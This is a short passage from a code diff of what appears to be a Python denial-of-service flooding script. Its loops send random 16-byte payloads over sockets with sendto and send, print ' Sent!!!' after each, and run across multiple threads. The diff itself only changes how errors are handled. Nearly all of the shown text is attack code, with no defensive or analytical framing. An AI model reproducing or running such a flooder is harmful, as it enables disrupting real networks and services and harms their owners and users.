s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print(i +" Sent!!!")
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
@@ -36,10 +36,8 @@ def run2():
				s.send(data)
			print(i +" Sent!!!")
		except:
			print(i +" Sent!!!")
			pass
			#s.close()
			#print("[*] Error")
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
--->
